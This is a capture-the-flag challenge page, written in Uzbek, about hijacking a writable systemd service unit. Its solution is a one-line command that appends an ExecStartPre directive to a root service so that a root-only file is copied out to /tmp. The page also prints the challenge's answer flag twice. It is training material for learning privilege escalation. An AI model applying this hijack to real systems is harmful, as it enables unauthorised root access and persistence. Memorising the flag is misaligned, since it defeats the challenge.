---
id: 41
title: "CH41: Systemd Service Unit Persistence Hijacking"
module: "Modul 5: Automation, Systemd & Kernel"
difficulty: Hard
points: 9
tags: ['systemd', 'persistence', 'services', 'privesc']
flag: "HD{systemd_unit_persistence_execstart_root_941}"
---

# 🎯 Topshiriq #41: CH41: Systemd Service Unit Persistence Hijacking

## 📌 Metama'lumotlar:
* **Modul:** `Modul 5: Automation, Systemd & Kernel`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #systemd, #persistence, #services, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
/etc/systemd/system/maintenance.service fayli yozish ruxsatiga ega. 'ExecStartPre' direktivasini kiritib, tizim servisini qayta yuklash orqali root flagini oling.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> echo 'ExecStartPre=/bin/sh -c "cat /root/flag.txt > /tmp/flag"' >> /etc/systemd/system/maintenance.service

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
echo 'ExecStartPre=/bin/sh -c "cat /root/flag.txt > /tmp/flag"' >> /etc/systemd/system/maintenance.service
```

---

## 🚩 Maxfiy Flag:
`HD{systemd_unit_persistence_execstart_root_941}`
